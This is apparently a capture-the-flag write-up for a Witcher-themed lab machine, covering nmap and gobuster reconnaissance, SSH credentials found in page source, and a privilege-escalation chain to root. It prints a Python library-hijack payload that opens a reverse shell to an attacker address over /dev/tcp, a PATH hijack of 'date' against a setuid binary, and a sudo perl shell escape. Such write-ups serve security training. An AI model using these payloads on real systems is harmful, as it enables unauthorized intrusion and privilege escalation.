# Toss a coin

## Intel

We scan the ip with nmap :

```bash
nmap -sC -sV 10.10.0.23
```

**Output**

```bash
nmap -sC -sV 10.10.0.23                      
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-17 08:01 +0000
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 17.91% done; ETC: 08:03 (0:01:57 remaining)
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 52.19% done; ETC: 08:02 (0:00:38 remaining)
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 08:02 (0:00:06 remaining)
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.19% done; ETC: 08:02 (0:00:00 remaining)
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.31% done; ETC: 08:02 (0:00:00 remaining)
Nmap scan report for 10.10.0.23
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: Toss a coin to your witcher
|_http-server-header: Apache/2.4.68 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can also use `gobuster` to check dir in the url

```bash
gobuster dir -u http://10.10.0.23/ -w ~/text -b 404
```

**Output:**

```bash

    ~  gobuster dir -u http://10.10.0.23/ -w ~/medium.txt -b 404                ✔  39s  
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.23/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/asakz/medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
img                  (Status: 301) [Size: 346] [--> http://10.10.0.23/img/]
t                    (Status: 301) [Size: 344] [--> http://10.10.0.23/t/]
server-status        (Status: 403) [Size: 315]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```

url/t leads us to a page with two sentences on it. 

```
"Do you know the lyrics? this one is pretty famous!"
```

Probably references the song the challengs is named after.

The /t folder is a bit odd

Running the dir bruteforce again, yet adding the /o at the end of the url, we get this

**Output:**

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.23/t/o/FUZZ
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/asakz/medium.txt
[+] Excluded Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=301] [Length=348] [Word=s] http://10.10.0.23/t/o/s [--> http://10.10.0.23/t/o/s/]
```

Since the name of the song is `Toss a coin to your witcher` , we can assume that the url spells the lyrics of the song.

After multiple bruteforces , we end up with this url : 

```
http://10.10.0.3/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
```

It sends us onto a page with a picture of Jaskier from The Witcher.

In the source code, there is their ssh credentials

```
jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

We can now log into their machine and begin exploitation

# Exploit and injections

When typing `sudo -l` , we can see 

```
Matching Defaults entries for jaskier on the_continent:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jaskier may run the following commands on the_continent:
    (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

We can launch this `.py` file with sudo (with the user `Yen`)

As we `cat` the file , we can see 

```python
import random
song = """When a humble bard
Graced a ride along
With Geralt of Rivia
Along came this song

From when the White Wolf fought
A silver-tongued devil
His army of elves
At his hooves did they revel

They came after me
With masterful deceit
Broke down my lute
And they kicked in my teeth

While the devil's horns
Minced our tender meat
And so cried the Witcher
He can't be bleat

Toss a coin to your Witcher
Oh, Valley of Plenty
Oh, Valley of Plenty, oh
Toss a coin to your Witcher
Oh, Valley of Plenty

At the edge of the world
Fight the mighty horde
That bashes and breaks you
And brings you to mourn

He thrust every elf
Far back on the shelf
High up on the mountain
From whence it came

He wiped out your pest
Got kicked in his chest
He's a friend of humanity
So give him the rest

That's my epic tale
Our champion prevailed
Defeated the villain
Now pour him some ale

Toss a coin to your Witcher
Oh, Valley of Plenty
Oh, Valley of Plenty, oh
Toss a coin to your Witcher
A friend of humanity

Toss a coin to your Witcher
Oh, Valley of Plenty
Oh, Valley of Plenty, oh
Toss a coin to your Witcher
A friend of humanity

Toss a coin to your Witcher
Oh, Valley of Plenty
Oh, Valley of Plenty, ah-ah, oh
Toss a coin to your Witcher
A friend of humanity"""

for i in range(10):
    line = random.choice(song.split("\n"))
    print("The line was:\t", line)
```

The `random` lib is our way in

We will create a random.py file in the jaskier home folder to trick python into reading it as a lib

```bash
echo "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.8.0.202/4445 0>&1\"')" > /home/jaskier/random.py
sudo -u yen /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Now that we are in `Yen`'s machine, let's dig deeper

When going into `/home/yen` we can see a `portal` bash script, `cat` gives us

**Output:**

```
@@@@����� �-�=�=x��-�=�=�888 XXXDDS�td888 P�td� � � DDQ�tdR�td�-�=�=hh/lib64/ld-linux-x86-64.so.2GNU�GNU�u&�󱗿<�4���o��kGNU
�
�e�mZ <v 5� 
            &"libc.so.6setuidputsgetcharsystem__cxa_finalizesetgid__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableui	N��@�?�?�?��?
�?�?�?�?�?	��H�H��/H��t��H���5z/��%{/��h���������h���������h���������h��������h����������%mH�=���.��H�=�.H��.H9�tH��.H��t�������H�=�.H�5�.H)�H��H��?H��H�H��tH��.H����fD�����=�.u+UH�=b.H��t
 H�=f.������d����].]������w�����UH���������������H�=����H�=8����H�=t��������H�=��v����]���AWL�=k+AVI��AUI��ATA��UH�-\+SL)�H�����H��t1��L��L��D��A��H��H9�u�H�[]A\A]A^A_�ff.������H�H��I am preparing a portal for you Geralt./bin/echo -n 'It will be ready in about ' && date --date='next hour����d��������4zR�����/D$4����`FJSegmentation fault (core dumped);@d���t����������$���\
K                               �?:*3$"\ ���t���P�9���TE�C
D�p���eF�I�E �E(�D0�H8�G@n8A0A(B BB�������
������o���
�
 �?xh�	������o����o���op���o�=0@P`@GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.08X|��p	�
�
 h
 ���� � !�=�=�=�?@@��
                     @!�7@F�=m�y�=������"����=��=��=�� ��?�
                                                           �  @1C@�J^}@�� @� � e�@��/�@��T��@
                                                                                              %9"crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.8060__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryportal.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_startgetchar@@GLIBC_2.2.5__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886XX$I|| W���o��a
```

It seems like nonsence but in the middle of the output, we can see `/bin/echo -n 'It will be ready in about ' && date --date='`

The script imports date from the system, as the lib from the `.py` file earlier, we can exploit it

```bash
cd /tmp
echo '/bin/bash -p' > date
chmod +x date
export PATH=/tmp:$PATH
/home/yen/portal
```

As earlier, we create a false lib, in this case a false date import that gives the permissions of the person who wrote the script.
We then hijack the `PATH` of the shell to match the path of our file
Launching the script sends us to the use `Geralt` who wrote the file in the first place

```bash
whoami
sudo -l
```

**Output:**

```
geralt
Matching Defaults entries for geralt on the_continent:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User geralt may run the following commands on the_continent:
    (root) NOPASSWD: /usr/bin/perl
```

Since perl can be used here, we will overwrite it with a shell with root permissions
"

```
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

Now that we are root, we can go in the root folder and gather the file we were searching for
